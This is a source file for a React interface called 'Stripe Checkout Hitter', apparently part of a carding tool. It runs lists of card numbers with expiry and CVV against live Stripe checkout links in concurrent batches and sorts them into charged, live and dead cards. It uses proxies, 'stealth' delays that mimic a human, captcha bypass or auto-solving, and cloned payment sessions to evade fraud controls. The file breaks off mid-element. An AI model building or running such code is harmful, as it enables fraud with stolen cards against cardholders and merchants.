import { useState, useRef, useEffect, useCallback, useMemo } from "react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import {
  Crosshair, Play, Square, Loader2, Link2, CheckCircle, XCircle,
  AlertTriangle, Download, Zap, DollarSign, CreditCard, Shield, Lock,
  Copy, RotateCcw, Volume2, VolumeX, ArrowDownToLine, RefreshCw,
  Timer, Gauge, Clock, GitBranch, ToggleLeft, ToggleRight, Layers,
  Trash2,
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";

// ─── Types ────────────────────────────────────────────────────────────────────

interface SessionData {
  sessionId: string;
  publishableKey: string;
  paymentIntentId: string;
  paymentIntentClientSecret: string;
  amount: number;
  currency: string;
  merchantName: string;
  description: string;
  status: string;
  mode: string;
  sessionToken: string;
  proxyCount?: number;
  originalUrl?: string;
  isBuyLink?: boolean;
  captcha?: { siteKey: string; rqdata: string; enforcementMode: string };
}

interface HitResult {
  card: string;
  status: "success" | "declined" | "error" | "approved";
  response: string;
  latency: number;
  piId?: string;
  sessionLocked?: boolean;
}

type ConsoleFilter = "all" | "hits" | "live" | "dead" | "errors";
type SpeedMode     = "fast" | "normal" | "stealth";

interface LogEntry {
  html: string;
  type: "info" | "hit" | "live" | "dead" | "error";
}

const MAX_LOGS    = 2000;
const SPEED_DELAY: Record<SpeedMode, number> = { fast: 0, normal: 500, stealth: 2000 };

// ─── Helpers ─────────────────────────────────────────────────────────────────

/** Escape HTML entities — prevents XSS when embedding server/user data in log HTML */
const esc = (s: string) =>
  String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");

function parseManualCards(raw: string): string[] {
  return raw.split("\n").map(l => l.trim()).filter(l => {
    if (!l) return false;
    const parts = l.split("|");
    return parts.length >= 4 && /^\d{13,19}$/.test(parts[0]?.replace(/\D/g, "") || "");
  });
}

// ─── Component ───────────────────────────────────────────────────────────────

export default function Hitter() {
  // ── state ──
  const [checkoutUrl, setCheckoutUrl]       = useState("");
  const [sessionData, setSessionData]       = useState<SessionData | null>(null);
  const [cardSource, setCardSource]         = useState<"approved" | "manual">("manual");
  const [manualCards, setManualCards]       = useState("");
  const [isHitting, setIsHitting]           = useState(false);
  const [results, setResults]               = useState<HitResult[]>([]);
  const [sessionLocked, setSessionLocked]   = useState(false);
  const [logs, setLogs]                     = useState<LogEntry[]>([
    { html: `<span class="text-cyan-400">$$$ STRIPE CHECKOUT HITTER v3.0 $$$</span>`, type: "info" },
    { html: `<span class="text-muted-foreground">Paste a checkout.stripe.com link and parse to begin</span>`, type: "info" },
  ]);
  const [progress, setProgress]             = useState({ current: 0, total: 0, success: 0, declined: 0, errors: 0 });
  const [concurrency, setConcurrency]       = useState(5);
  const [speedMode, setSpeedMode]           = useState<SpeedMode>("normal");
  const [autoScroll, setAutoScroll]         = useState(true);
  const [soundEnabled, setSoundEnabled]     = useState(false);
  const [consoleFilter, setConsoleFilter]   = useState<ConsoleFilter>("all");
  const [latencies, setLatencies]           = useState<number[]>([]);
  const [cloneCount, setCloneCount]         = useState(3);
  const [clonedSessions, setClonedSessions] = useState<SessionData[]>([]);
  const [clonedTokens, setClonedTokens]     = useState<string[]>([]);
  const [isCloning, setIsCloning]           = useState(false);
  const [confirmDelay, setConfirmDelay]     = useState(0);
  const [tokenReuse, setTokenReuse]         = useState(false);
  const [browserMode, setBrowserMode]       = useState<"off" | "auto" | "on">("auto");
  const [lockedSessionCount]                = useState(0);

  // ── refs ──
  const abortRef    = useRef(false);
  const hittingRef  = useRef(false);   // immediate double-start guard (sync)
  const consoleRef  = useRef<HTMLDivElement>(null);
  const audioRef    = useRef<AudioContext | null>(null);

  const { toast } = useToast();

  // ── queries ──
  const { data: approvedCards } = useQuery({ queryKey: ["/api/checks/approved-cards"] });

  // ── auto-scroll ──
  useEffect(() => {
    if (autoScroll && consoleRef.current) {
      consoleRef.current.scrollTop = consoleRef.current.scrollHeight;
    }
  }, [logs, autoScroll]);

  // ── log helpers (capped at MAX_LOGS) ──
  const addLog = useCallback((html: string, type: LogEntry["type"] = "info") => {
    setLogs(prev => {
      const next = [...prev, { html, type }];
      return next.length > MAX_LOGS ? next.slice(-MAX_LOGS) : next;
    });
  }, []);

  const addLogs = useCallback((entries: LogEntry[]) => {
    setLogs(prev => {
      const next = [...prev, ...entries];
      return next.length > MAX_LOGS ? next.slice(-MAX_LOGS) : next;
    });
  }, []);

  // ── sound ──
  const playHitSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      if (!audioRef.current) {
        audioRef.current = new AudioContext();
      }
      const ctx = audioRef.current;
      // Resume if browser auto-suspended it (requires user gesture)
      const play = () => {
        const osc  = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.setValueAtTime(880,  ctx.currentTime);
        osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.3);
      };
      if (ctx.state === "suspended") {
        ctx.resume().then(play).catch(() => {});
      } else {
        play();
      }
    } catch {}
  }, [soundEnabled]);

  // ── computed ──
  const avgLatency = useMemo(() => {
    if (latencies.length === 0) return 0;
    return Math.round(latencies.reduce((a, b) => a + b, 0) / latencies.length);
  }, [latencies]);

  const eta = useMemo(() => {
    if (!isHitting || progress.total === 0 || progress.current === 0 || avgLatency === 0) return null;
    const remaining       = progress.total - progress.current;
    const batchesLeft     = Math.ceil(remaining / concurrency);
    const seconds         = Math.ceil((batchesLeft * avgLatency) / 1000);
    if (seconds < 60) return `${seconds}s`;
    return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;
  }, [isHitting, progress, avgLatency, concurrency]);

  const filteredLogs = useMemo(() => {
    if (consoleFilter === "all") return logs;
    return logs.filter(l => {
      switch (consoleFilter) {
        case "hits":   return l.type === "hit";
        case "live":   return l.type === "live";
        case "dead":   return l.type === "dead";
        case "errors": return l.type === "error";
        default:       return true;
      }
    });
  }, [logs, consoleFilter]);

  const filterCounts = useMemo(() => ({
    all:    logs.length,
    hits:   logs.filter(l => l.type === "hit").length,
    live:   logs.filter(l => l.type === "live").length,
    dead:   logs.filter(l => l.type === "dead").length,
    errors: logs.filter(l => l.type === "error").length,
  }), [logs]);

  const successResults  = results.filter(r => r.status === "success");
  const liveResults     = results.filter(r => r.status === "declined" && r.response.includes("LIVE"));
  const pct             = progress.total > 0 ? ((progress.current / progress.total) * 100).toFixed(1) : "0";
  const approvedCount   = (approvedCards as string[])?.length || 0;
  const manualCardCount = useMemo(() => parseManualCards(manualCards).length, [manualCards]);

  // ── parse mutation ──
  const parseMutation = useMutation({
    mutationFn: async (url: string) => {
      const res = await apiRequest("POST", "/api/hitter/parse", { url });
      return res.json();
    },
    onSuccess: (data: SessionData) => {
      setSessionData(data);
      setResults([]);
      setSessionLocked(false);
      setLatencies([]);
      setProgress({ current: 0, total: 0, success: 0, declined: 0, errors: 0 });
      const lines: LogEntry[] = [
        { html: `<span class="text-cyan-400 font-bold">[PARSE]</span> Session loaded`, type: "info" },
        { html: `<span class="text-muted-foreground">  Merchant:</span> <span class="text-foreground">${esc(data.merchantName)}</span>`, type: "info" },
        { html: `<span class="text-muted-foreground">  Amount:</span> <span class="text-emerald-400 font-bold">$${esc(String(data.amount))} ${esc(data.currency)}</span>`, type: "info" },
        { html: `<span class="text-muted-foreground">  Mode:</span> <span class="text-blue-400">${esc((data.mode || "payment").toUpperCase())}</span>`, type: "info" },
        { html: `<span class="text-muted-foreground">  Status:</span> <span class="${data.status === "open" ? "text-emerald-400" : "text-yellow-400"}">${esc(data.status.toUpperCase())}</span>`, type: "info" },
        data.paymentIntentId
          ? { html: `<span class="text-muted-foreground">  PI:</span> <span class="text-foreground/70">${esc(data.paymentIntentId)}</span>`, type: "info" as const }
          : { html: `<span class="text-muted-foreground">  PI:</span> <span class="text-foreground/50">Created on confirm</span>`, type: "info" as const },
      ];
      if (data.proxyCount !== undefined) {
        lines.push({ html: `<span class="text-muted-foreground">  Proxies:</span> <span class="text-purple-400 font-bold">${data.proxyCount}</span>`, type: "info" });
      }
      if (data.captcha) {
        const mode      = esc(data.captcha.enforcementMode || "unknown");
        const modeColor = data.captcha.enforcementMode === "open" ? "text-yellow-400" : "text-red-400";
        lines.push({ html: `<span class="text-amber-500 font-bold">[CAPTCHA]</span> hCaptcha detected — <span class="${modeColor}">${mode.toUpperCase()}</span> mode`, type: "info" });
        if (data.captcha.enforcementMode === "open" && data.mode === "subscription") {
          lines.push({ html: `<span class="text-cyan-400">  Tokenize mode — PM creation validates card, charge skipped</span>`, type: "info" });
        } else if (data.captcha.enforcementMode === "open") {
          lines.push({ html: `<span class="text-muted-foreground">  API bypass active — captcha not enforced</span>`, type: "info" });
        } else {
          lines.push({ html: `<span class="text-orange-400">  Captcha enforced — set CAPSOLVER_API_KEY for auto-solve</span>`, type: "info" });
        }
      }
      lines.push({ html: `<span class="text-cyan-400">Ready. Load cards and fire.</span>`, type: "info" });
      addLogs(lines);
    },
    onError: (err: any) => {
      addLog(`<span class="text-red-500 font-bold">[PARSE FAILED]</span> <span class="text-red-400">${esc(err.message || "Unknown error")}</span>`, "error");
      toast({ title: "Parse Failed", description: err.message, variant: "destructive" });
    },
  });

  const handleRefreshSession = () => {
    if (!checkoutUrl || parseMutation.isPending || isHitting) return;
    addLog(`<span class="text-cyan-400 font-bold">[REFRESH]</span> Re-initializing session...`, "info");
    parseMutation.mutate(checkoutUrl);
  };

  // ── main hit loop ──
  const handleHit = async () => {
    if (!sessionData || hittingRef.current) return;

    const cards: string[] =
      cardSource === "approved"
        ? (approvedCards as string[]) || []
        : parseManualCards(manualCards);

    if (cards.length === 0) {
      toast({ title: "No Cards", description: "No valid cards queued.", variant: "destructive" });
      return;
    }

    // Guard immediately (sync) before any await
    hittingRef.current = true;
    setIsHitting(true);
    setSessionLocked(false);
    abortRef.current = false;
    setResults([]);
    setLatencies([]);
    setProgress({ current: 0, total: cards.length, success: 0, declined: 0, errors: 0 });

    // Capture start time locally — React state is async and would be stale inside closure
    const hitStartTime = Date.now();

    const modeLabel   = speedMode.toUpperCase();
    const sessionCount = clonedTokens.length > 0 ? clonedTokens.length : 1;
    const extraParts  = [];
    if (confirmDelay > 0)    extraParts.push(`delay:${confirmDelay}ms`);
    if (tokenReuse)          extraParts.push("reuse:ON");
    if (browserMode !== "off") extraParts.push(`browser:${browserMode.toUpperCase()}`);
    if (sessionCount > 1)    extraParts.push(`sessions:${sessionCount}`);
    const extraStr = extraParts.length > 0 ? ` | <span class="text-cyan-400">${extraParts.join(" ")}</span>` : "";
    addLog(
      `<span class="text-cyan-400 font-bold">[START]</span> ` +
      `Hitting <span class="text-foreground font-bold">${cards.length}</span> cards against ` +
      `<span class="text-emerald-400 font-bold">$${esc(String(sessionData.amount))} ${esc(sessionData.currency)}</span> | ` +
      `<span class="text-blue-400">${esc(sessionData.merchantName)}</span> | ` +
      `<span class="text-purple-400">×${concurrency} ${modeLabel}</span>${extraStr}`,
      "info",
    );

    let success = 0, declined = 0, errors = 0, locked = false;
    const BATCH = concurrency;
    const delay = SPEED_DELAY[speedMode];

    try {
      for (let i = 0; i < cards.length; i += BATCH) {
        if (abortRef.current) {
          addLog(`<span class="text-yellow-500 font-bold">[ABORT]</span> Stopped at ${i}/${cards.length}`, "info");
          break;
        }
        if (locked) {
          const remaining = cards.length - i;
          errors += remaining;
          addLog(`<span class="text-orange-400 font-bold">[LOCK]</span> Session locked. Skipping <span class="text-foreground font-bold">${remaining}</span> remaining.`, "error");
          setProgress(prev => ({ ...prev, current: cards.length, errors }));
          break;
        }

        if (delay > 0 && i > 0) {
          await new Promise(r => setTimeout(r, delay));
          if (abortRef.current) break;
        }

        const batch      = cards.slice(i, i + BATCH);
        const batchStart = Date.now();

        try {
          const payload: any = {
            sessionToken: sessionData.sessionToken,
            cards: batch,
            confirmDelay,
            tokenReuse,
            browserMode: browserMode === "on" ? true : browserMode === "auto" ? "auto" : false,
          };
          if (clonedTokens.length > 0) payload.sessionTokens = clonedTokens;

          const res          = await apiRequest("POST", "/api/hitter/hit", payload);
          const batchResults: HitResult[] = await res.json();
          const batchLatency = Date.now() - batchStart;
          setLatencies(prev => [...prev, batchLatency]);

          const newLogs: LogEntry[] = [];
          for (const r of batchResults) {
            const latStr = r.latency > 0 ? ` <span class="text-muted-foreground/40">${r.latency}ms</span>` : "";
            const resp   = esc(r.response);

            if (r.status === "success") {
              success++;
              playHitSound();
              const tag =
                r.response.includes("CHARGED") ? ["CHARGED", "text-emerald-400"] :
                r.response.includes("3DS")     ? ["3DS",     "text-amber-400"]   :
                r.response.includes("AUTH OK") ? ["AUTH",    "text-emerald-400"] :
                r.response.includes("SETUP OK")? ["SETUP",   "text-emerald-400"] :
                                                  ["HIT",     "text-emerald-400"];
              newLogs.push({ html: `<span class="${tag[1]} font-bold">[${tag[0]}]</span> <span class="${tag[1]}/80">${resp}</span>${latStr}`, type: "hit" });
            } else if (r.status === "approved") {
              success++;
              playHitSound();
              newLogs.push({ html: `<span class="text-cyan-400 font-bold">[APPROVED]</span> <span class="text-cyan-300">${resp}</span>${latStr}`, type: "hit" });
            } else if (r.status === "declined") {
              declined++;
              if (r.response.includes("DECLINED (LIVE)")) {
                newLogs.push({ html: `<span class="text-orange-400 font-bold">[LIVE]</span> <span class="text-orange-300">${resp}</span>${latStr}`, type: "live" });
              } else {
                newLogs.push({ html: `<span class="text-red-500 font-bold">[DEAD]</span> <span class="text-red-400/80">${resp}</span>${latStr}`, type: "dead" });
              }
            } else {
              errors++;
              if (r.response.includes("SKIPPED")) {
                newLogs.push({ html: `<span class="text-muted-foreground/50">[SKIP]</span> <span class="text-muted-foreground/50">${resp}</span>`, type: "error" });
              } else if (r.response.includes("SESSION LOCKED") || r.response.includes("SESSION USED") || r.response.includes("SESSION COMPLETE")) {
                newLogs.push({ html: `<span class="text-orange-500 font-bold">[LOCK]</span> <span class="text-orange-400">${resp}</span>${latStr}`, type: "error" });
              } else if (r.response.includes("BROWSER UNAVAILABLE")) {
                newLogs.push({ html: `<span class="text-purple-400 font-bold">[BROWSER]</span> <span class="text-purple-300/80">${resp}</span>`, type: "error" });
              } else {
                newLogs.push({ html: `<span class="text-yellow-500 font-bold">[ERR]</span> <span class="text-yellow-400/80">${resp}</span>${latStr}`, type: "error" });
              }
            }

            if (r.sessionLocked) { locked = true; setSessionLocked(true); }
          }

          setResults(prev => [...prev, ...batchResults]);
          addLogs(newLogs);
          setProgress({ current: Math.min(i + BATCH, cards.length), total: cards.length, success, declined, errors });
        } catch (batchErr: any) {
          errors += batch.length;
          addLog(`<span class="text-yellow-500 font-bold">[ERR]</span> <span class="text-yellow-400">Batch failed: ${esc(batchErr.message || "Network error")}</span>`, "error");
          setProgress(prev => ({ ...prev, current: Math.min(i + BATCH, cards.length), errors }));
        }
      }

      if (!abortRef.current) {
        const elapsed = Math.round((Date.now() - hitStartTime) / 1000);
        const total   = success + declined + errors;
        addLogs([
          { html: `<span class="text-cyan-400/50">${"─".repeat(40)}</span>`, type: "info" },
          {
            html:
              `<span class="text-cyan-400 font-bold">[DONE]</span> ` +
              `<span class="text-emerald-400">${success} hit</span> | ` +
              `<span class="text-red-400">${declined} dead</span> | ` +
              `<span class="text-yellow-400">${errors} err</span> | ` +
              `<span class="text-muted-foreground">${total} total · ${elapsed}s</span>`,
            type: "info",
          },
          ...(locked ? [{ html: `<span class="text-orange-400 font-bold">[!]</span> <span class="text-orange-300">Session locked. Use a fresh link for more hits.</span>`, type: "info" as const }] : []),
        ]);
      }
    } finally {
      // Always reset — even if an unexpected error occurred
      hittingRef.current = false;
      setIsHitting(false);
    }
  };

  const handleStop = () => {
    abortRef.current = true;
    addLog(`<span class="text-yellow-500 font-bold">[ABORT]</span> Stop signal sent...`, "info");
  };

  const handleClone = async () => {
    if (!checkoutUrl || isCloning || isHitting) return;
    setIsCloning(true);
    addLog(`<span class="text-purple-400 font-bold">[CLONE]</span> Cloning ${cloneCount} sessions from Payment Link...`, "info");
    try {
      const res  = await apiRequest("POST", "/api/hitter/clone", { url: checkoutUrl, count: cloneCount });
      const data = await res.json();
      setClonedSessions(data.sessions);
      setClonedTokens(data.sessionTokens);
      const lines: LogEntry[] = [
        { html: `<span class="text-purple-400 font-bold">[CLONE]</span> <span class="text-emerald-400">${data.totalCloned}</span> sessions cloned`, type: "info" },
        ...data.sessions.map((s: any, i: number) => ({
          html: `<span class="text-muted-foreground">  Session ${i + 1}:</span> <span class="text-foreground/60">${esc(s.sessionId?.substring(0, 30) || "")}…</span>`,
          type: "info" as const,
        })),
        { html: `<span class="text-purple-400">Session pool ready. Cards distributed across sessions.</span>`, type: "info" },
      ];
      addLogs(lines);
      toast({ title: "Sessions Cloned", description: `${data.totalCloned} sessions created.` });
    } catch (err: any) {
      addLog(`<span class="text-red-500 font-bold">[CLONE FAILED]</span> <span class="text-red-400">${esc(err.message || "Unknown error")}</span>`, "error");
      toast({ title: "Clone Failed", description: err.message, variant: "destructive" });
    } finally {
      setIsCloning(false);
    }
  };

  const handleReset = () => {
    setSessionData(null);
    setResults([]);
    setSessionLocked(false);
    setLatencies([]);
    setProgress({ current: 0, total: 0, success: 0, declined: 0, errors: 0 });
    setCheckoutUrl("");
    setConsoleFilter("all");
    setClonedSessions([]);
    setClonedTokens([]);
    setConfirmDelay(0);
    setTokenReuse(false);
    setLogs([
      { html: `<span class="text-cyan-400">$$$ STRIPE CHECKOUT HITTER v3.0 $$$</span>`, type: "info" },
      { html: `<span class="text-muted-foreground">Paste a checkout.stripe.com link and parse to begin</span>`, type: "info" },
    ]);
  };

  const exportResults = (type: "all" | "success" | "live") => {
    const filtered =
      type === "success" ? results.filter(r => r.status === "success") :
      type === "live"    ? results.filter(r => r.status === "declined" && r.response.includes("LIVE")) :
      results;
    const blob = new Blob([filtered.map(r => `${r.card} | ${r.status.toUpperCase()} | ${r.response}`).join("\n")], { type: "text/plain" });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement("a");
    a.href = url; a.download = `hitter_${type}_${Date.now()}.txt`; a.click();
    URL.revokeObjectURL(url);
    toast({ title: "Exported", description: `${filtered.length} results exported.` });
  };

  const copyResults = (type: "success" | "live") => {
    const filtered =
      type === "success" ? results.filter(r => r.status === "success") :
      results.filter(r => r.status === "declined" && r.response.includes("LIVE"));
    navigator.clipboard.writeText(filtered.map(r => r.card).join("\n"));
    toast({ title: "Copied", description: `${filtered.length} cards copied.` });
  };

  // ─── Render ──────────────────────────────────────────────────────────────────

  return (
    <div className="space-y-4 md:space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div>
          <h2 className="text-2xl md:text-3xl font-display font-bold text-foreground glitch-text" data-testid="text-hitter-title">
            Stripe Checkout Hitter
          </h2>
          <p className="text-muted-foreground font-mono mt-0.5 text-xs">Auto-hit checkout links with card lists</p>
        </div>
        {sessionData && (
          <div className="flex items-center gap-2">
            <Button onClick={handleRefreshSession} disabled={parseMutation.isPending || isHitting}
              variant="outline" size="sm" className="rounded-none border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 font-mono text-xs" data-testid="button-refresh-session">
              <RefreshCw className="w-3 h-3 mr-1" /> REFRESH
            </Button>
            <Button onClick={handleReset} variant="outline" size="sm"
              className="rounded-none border-primary/30 font-mono text-xs" data-testid="button-reset">
              <RotateCcw className="w-3 h-3 mr-1" /> NEW SESSION
            </Button>
          </div>
        )}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 md:gap-6">
        {/* ── Left Panel ── */}
        <div className="lg:col-span-1 space-y-4">

          {/* Checkout link */}
          <Card className="glass-panel rounded-none border-t-4 border-t-accent">
            <CardHeader className="border-b border-white/[0.06] pb-3">
              <CardTitle className="font-display tracking-widest text-sm flex items-center gap-2">
                <Link2 className="w-4 h-4 text-accent" /> CHECKOUT LINK
              </CardTitle>
            </CardHeader>
            <CardContent className="p-4 space-y-3">
              <Input
                placeholder="https://checkout.stripe.com/c/pay/cs_live_..."
                value={checkoutUrl}
                onChange={(e) => setCheckoutUrl(e.target.value)}
                onKeyDown={(e) => { if (e.key === "Enter" && checkoutUrl && !parseMutation.isPending) parseMutation.mutate(checkoutUrl); }}
                className="rounded-none bg-background/50 border-white/[0.08] font-mono text-xs"
                data-testid="input-checkout-url"
              />
              <div className="flex gap-2">
                <Button
                  onClick={() => parseMutation.mutate(checkoutUrl)}
                  disabled={!checkoutUrl || parseMutation.isPending || isHitting}
                  className="flex-1 rounded-none bg-accent/20 text-accent border border-accent hover:bg-accent hover:text-black font-display font-bold tracking-widest text-xs h-9"
                  data-testid="button-parse-link"
                >
                  {parseMutation.isPending
                    ? <><Loader2 className="w-3 h-3 mr-2 animate-spin" /> PARSING...</>
                    : <><Crosshair className="w-3 h-3 mr-2" /> PARSE LINK</>}
                </Button>
                {(sessionData?.isBuyLink || checkoutUrl.includes("buy.stripe.com")) && (
                  <Button onClick={handleClone} disabled={!checkoutUrl || isCloning || isHitting}
                    className="rounded-none bg-purple-500/20 text-purple-400 border border-purple-500 hover:bg-purple-500 hover:text-black font-display font-bold tracking-widest text-xs h-9 px-3"
                    data-testid="button-clone-sessions">
                    {isCloning ? <><Loader2 className="w-3 h-3 mr-1 animate-spin" /> CLONING</> : <><GitBranch className="w-3 h-3 mr-1" /> CLONE</>}
                  </Button>
                )}
              </div>
              {(sessionData?.isBuyLink || checkoutUrl.includes("buy.stripe.com")) && (
                <div className="space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground font-mono text-[10px] flex items-center gap-1">
                      <Layers className="w-3 h-3" /> CLONE COUNT
                    </span>
                    <span className="text-purple-400 font-mono text-xs font-bold">{cloneCount}</span>
                  </div>
                  <input type="range" min={2} max={10} value={cloneCount} onChange={(e) => setCloneCount(Number(e.target.value))}
                    className="w-full h-1 bg-purple-500/20 appearance-none cursor-pointer [&::-webkit-slider-thumb]:appearance-none [&::-webkit-slider-thumb]:w-3 [&::-webkit-slider-thumb]:h-3 [&::-webkit-slider-thumb]:bg-purple-400 [&::-webkit-slider-thumb]:rounded-none"
                    disabled={isCloning || isHitting} />
                  <div className="flex justify-between text-[9px] text-muted-foreground/50 font-mono"><span>2</span><span>5</span><span>10</span></div>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Session info */}
          {sessionData && (
            <Card className={`glass-panel rounded-none border-l-2 ${sessionLocked ? "border-l-orange-500" : "border-l-primary"}`}>
              <CardHeader className="border-b border-white/[0.06] pb-3">
                <CardTitle className="font-display tracking-widest text-sm flex items-center gap-2">
                  {sessionLocked
                    ? <><Lock className="w-4 h-4 text-orange-500" /><span className="text-orange-500">SESSION LOCKED</span></>
                    : <><DollarSign className="w-4 h-4 text-primary" /> SESSION INFO</>}
                </CardTitle>
              </CardHeader>
              <CardContent className="p-4 space-y-2 font-mono text-xs">
                {[
                  ["Amount",   `$${sessionData.amount} ${sessionData.currency}`, "text-emerald-400 font-bold text-sm"],
                  ["Merchant", sessionData.merchantName, "text-foreground font-medium truncate ml-2 max-w-[160px]"],
                  ["Mode",     (sessionData.mode || "unknown").toUpperCase(), "text-blue-400 font-bold"],
                ].map(([label, value, cls]) => (
                  <div key={label} className="flex justify-between items-center">
                    <span className="text-muted-foreground">{label}:</span>
                    <span className={cls}>{value}</span>
                  </div>
                ))}
                <div className="flex justify-between items-center">
                  <span className="text-muted-foreground">Status:</span>
                  {sessionLocked
                    ? <span className="text-orange-500 font-bold">LOCKED</span>
                    : <span className={sessionData.status === "open" ? "text-emerald-400 font-bold" : "text-yellow-400"}>{sessionData.status.toUpperCase()}</span>}
                </div>
                {sessionData.proxyCount !== undefined && (
                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">Proxies:</span>
                    <span className="text-purple-400 font-bold">{sessionData.proxyCount}</span>
                  </div>
                )}
                {clonedSessions.length > 0 && (
                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">Sessions:</span>
                    <span className="text-purple-400 font-bold">{clonedSessions.length - lockedSessionCount}/{clonedSessions.length} active</span>
                  </div>
                )}
                {sessionData.captcha && (
                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">Captcha:</span>
                    <span className={`font-bold ${sessionData.captcha.enforcementMode === "open" ? "text-yellow-400" : "text-red-400"}`}>
                      hCaptcha ({sessionData.captcha.enforcementMode.toUpperCase()})
                    </span>
                  </div>
                )}
              </CardContent>
            </Card>
          )}

          {/* Card source + controls */}
          <Card className="glass-panel rounded-none">
            <CardHeader className="border-b border-white/[0.06] pb-3">
              <CardTitle className="font-display tracking-widest text-sm flex items-center gap-2">
                <CreditCard className="w-4 h-4 text-blue-400" /> CARD SOURCE
              </CardTitle>
            </CardHeader>
            <CardContent className="p-4 space-y-3">
              {/* Source toggle */}
              <div className="flex gap-2">
                <Button variant={cardSource === "approved" ? "default" : "outline"} size="sm"
                  onClick={() => setCardSource("approved")}
                  className={`flex-1 rounded-none font-mono text-xs ${cardSource === "approved" ? "bg-primary text-black" : "border-primary/30 text-muted-foreground"}`}
                  data-testid="button-source-approved">
                  DB Approved ({approvedCount})
                </Button>
                <Button variant={cardSource === "manual" ? "default" : "outline"} size="sm"
                  onClick={() => setCardSource("manual")}
                  className={`flex-1 rounded-none font-mono text-xs ${cardSource === "manual" ? "bg-blue-400/20 text-blue-400 border border-blue-400" : "border-primary/30 text-muted-foreground"}`}
                  data-testid="button-source-manual">
                  Manual Input
                </Button>
              </div>

              {cardSource === "manual" && (
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[10px] font-mono text-muted-foreground">
                    <span>CC|MM|YYYY|CVV</span>
                    <div className="flex items-center gap-2">
                      {manualCardCount > 0 && (
                        <span className="text-primary">{manualCardCount} valid</span>
                      )}
                      {manualCards.trim() && (
                        <button onClick={() => setManualCards("")} className="text-muted-foreground/40 hover:text-destructive transition-colors" title="Clear cards">
                          <Trash2 className="w-3 h-3" />
                        </button>
                      )}
                    </div>
                  </div>
                  <Textarea
                    placeholder={"CC|MM|YYYY|CVV (one per line)\n4111111111111111|12|2026|123"}
                    value={manualCards}
                    onChange={(e) => setManualCards(e.target.value)}
                    rows={5}
                    className="rounded-none bg-background/50 border-white/[0.08] font-mono text-xs resize-none"
                    data-testid="textarea-manual-cards"
                  />
                </div>
              )}

              {cardSource === "approved" && approvedCount > 0 && (
                <div className="text-xs font-mono text-muted-foreground max-h-28 overflow-y-auto custom-scrollbar space-y-0.5 border border-primary/10 p-2 bg-background/30">
                  {(approvedCards as string[]).slice(0, 20).map((c, i) => (
                    <div key={i} className="truncate">{c}</div>
                  ))}
                  {approvedCount > 20 && <div className="text-primary">...and {approvedCount - 20} more</div>}
                </div>
              )}

              {/* Concurrency */}
              <div className="space-y-1.5 border border-primary/10 p-3 bg-background/20">
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground font-mono text-[10px] flex items-center gap-1"><Gauge className="w-3 h-3" /> CONCURRENCY</span>
                  <span className="text-primary font-mono text-xs font-bold">×{concurrency}</span>
                </div>
                <input type="range" min={1} max={10} value={concurrency} onChange={(e) => setConcurrency(Number(e.target.value))}
                  className="w-full h-1 bg-primary/20 appearance-none cursor-pointer [&::-webkit-slider-thumb]:appearance-none [&::-webkit-slider-thumb]:w-3 [&::-webkit-slider-thumb]:h-3 [&::-webkit-slider-thumb]:bg-primary [&::-webkit-slider-thumb]:rounded-none"
                  disabled={isHitting} data-testid="slider-concurrency" />
                <div className="flex justify-between text-[9px] text-muted-foreground/50 font-mono"><span>1</span><span>5</span><span>10</span></div>
              </div>

              {/* Speed mode */}
              <div className="space-y-1.5 border border-primary/10 p-3 bg-background/20">
                <span className="text-muted-foreground font-mono text-[10px] flex items-center gap-1"><Timer className="w-3 h-3" /> SPEED MODE</span>
                <div className="flex gap-1">
                  {(["fast", "normal", "stealth"] as SpeedMode[]).map(mode => (
                    <Button key={mode} size="sm" disabled={isHitting} onClick={() => setSpeedMode(mode)}
                      className={`flex-1 rounded-none font-mono text-[10px] h-7 ${
                        speedMode === mode
                          ? mode === "fast"   ? "bg-red-500/20 text-red-400 border border-red-500/50"
                          : mode === "normal" ? "bg-blue-500/20 text-blue-400 border border-blue-500/50"
                                              : "bg-emerald-500/20 text-emerald-400 border border-emerald-500/50"
                          : "bg-transparent text-muted-foreground border border-primary/20 hover:border-primary/40"
                      }`} data-testid={`button-speed-${mode}`}>
                      {mode === "fast" ? "⚡ FAST" : mode === "normal" ? "● NORMAL" : "🥷 STEALTH"}
                    </Button>
                  ))}
                </div>
                <div className="text-[9px] text-muted-foreground/50 font-mono text-center">
                  {speedMode === "fast" ? "No delay" : speedMode === "normal" ? "500ms delay between batches" : "2s delay — mimics human"}
                </div>
              </div>

              {/* Confirm delay */}
              <div className="space-y-1.5 border border-primary/10 p-3 bg-background/20">
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground font-mono text-[10px] flex items-center gap-1"><Clock className="w-3 h-3" /> CONFIRM DELAY</span>
                  <span className="text-cyan-400 font-mono text-xs font-bold">{confirmDelay === 0 ? "OFF" : `${(confirmDelay / 1000).toFixed(1)}s`}</span>
                </div>
                <input type="range" min={0} max={8000} step={500} value={confirmDelay} onChange={(e) => setConfirmDelay(Number(e.target.value))}
